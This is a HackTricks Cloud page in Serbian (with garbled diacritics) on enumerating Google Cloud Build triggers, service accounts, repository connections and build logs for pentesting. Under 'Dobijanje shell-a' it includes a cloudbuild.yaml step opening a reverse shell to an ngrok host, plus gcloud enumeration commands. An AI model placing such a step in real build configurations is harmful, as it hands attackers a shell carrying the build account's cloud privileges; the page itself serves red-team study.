# GCP - Cloud Build Enum

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Google Cloud Build je upravljana CI/CD platforma koja **automatizuje procese izgradnje softvera** i pu코tanja u rad, integri코u캖i se sa **repozitorijumima izvornog koda** i podr쬬vaju캖i 코irok spektar programskih jezika. Omogu캖ava programerima da **automatski izgrade, testiraju i implementiraju kod** pru쬬ju캖i fleksibilnost za prilago캠avanje koraka izgradnje i radnih tokova.

Svaki Cloud Build okida캜 je **povezan sa Cloud repozitorijumom ili direktno povezan sa spoljnim repozitorijumom** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nisam mogao da vidim na캜in da ukradem Github/Bitbucket token odavde ili iz Cloud repozitorijuma jer kada se repozitorijum preuzme, pristupa se preko [https://source.cloud.google.com/](https://source.cloud.google.com/) URL-a i Github nije pristupa캜an klijentu.
{% endhint %}

### Doga캠aji

Cloud Build mo쬰 biti okida캜 ako:

* **Pritisak na granu**: Navedite granu
* **Pritisak novog taga**: Navedite tag
* **Pull zahtev**: Navedite granu koja prima PR
* **Ru캜no pozivanje**
* **Pub/Sub poruka**: Navedite temu
* **Webhook doga캠aj**: Izlo쬴캖e HTTPS URL i zahtev mora biti autentifikovan sa tajnom

### Izvr코enje

Postoje 3 opcije:

* Yaml/json **specifikacija komandi** za izvr코enje. Obi캜no: `/cloudbuild.yaml`
* Jedna koja se mo쬰 specificirati "inline" u web konzoli i u CLI
* Naj캜e코캖a opcija
* Relevantna za neautentifikovan pristup
* **Dockerfile** za izgradnju
* **Buildpack** za izgradnju

### Dozvole SA

**Servisni nalog ima `cloud-platform` opseg**, tako da mo쬰 **koristiti sve privilegije.** Ako **nije specificiran SA** (kao kada se vr코i podno코enje) **podrazumevani SA** `<proj-broj>@cloudbuild.gserviceaccount.com` 캖e biti **kori코캖en.**

Podrazumevano nisu date nikakve dozvole, ali je prili캜no lako dati neke:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Odobrenja

Mogu캖e je konfigurisati Cloud Build da **zahteva odobrenja za izvr코enje izgradnje** (podrazumevano onemogu캖eno).

### PR Odobrenja

Kada je okida캜 PR jer **svako mo쬰 izvr코iti PR na javne repozitorijume** bilo bi veoma opasno dozvoliti izvr코enje okida캜a sa bilo kojim PR-om. Stoga, podrazumevano, izvr코enje 캖e biti **automatsko samo za vlasnike i saradnike**, i kako bi se izvr코io okida캜 sa PR-ovima drugih korisnika, vlasnik ili saradnik mora komentarisati `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### Povezivanja & Repozitorijumi

Povezivanja se mogu kreirati preko:

* **GitHub-a**: Prikaza캖e OAuth prozor zahtevaju캖i dozvole za **dobijanje Github tokena** koji 캖e biti sa캜uvan unutar **Menad쬰ra tajni.**
* **GitHub Enterprise-a**: Zatra쬴캖e instalaciju **GithubApp**-a. Autentifikacioni token sa va코eg GitHub Enterprise hosta 캖e biti kreiran i sa캜uvan u ovom projektu kao tajna **Menad쬰ra tajni.**
* **GitLab-a / Enterprise-a**: Potrebno je **pru쬴ti API pristupni token i 캜itati API pristupni token** koji 캖e biti sa캜uvani u **Menad쬰ru tajni.**

Kada se generi코e veza, mo쬰te je koristiti da **pove쬰te repozitorijume kojima Github nalog ima pristup**.

Ova opcija je dostupna putem dugmeta:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Imajte na umu da su repozitorijumi povezani ovim metodom **dostupni samo u okida캜ima koji koriste 2. generaciju.**
{% endhint %}

### Pove쬴 Repozitorijum

Ovo nije isto kao **`povezivanje`**. Ovo omogu캖ava **razli캜ite** na캜ine za **pristup Github ili Bitbucket** repozitorijumu ali **ne generi코e objekat povezivanja, ve캖 generi코e objekat repozitorijuma (prve generacije).**

Ova opcija je dostupna putem dugmeta:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Skladi코tenje

Ponekad 캖e Cloud Build **generisati novo skladi코te za 캜uvanje datoteka za okida캜**. To se na primer de코ava u primeru koji GCP nudi sa:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Kreiran je skladi코ni bucket pod nazivom [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) kako bi se 캜uvala `.tgz` datoteka sa fajlovima koji 캖e biti kori코캖eni.

### Dobijanje shell-a
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Instalirajte gcloud unutar Cloud Build-a:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeracija

Mo쬰te prona캖i **osetljive informacije u konfiguracijama izgradnje i zapisnicima**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacija privilegija

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Neautentifikovan pristup

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post eksploatacija

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
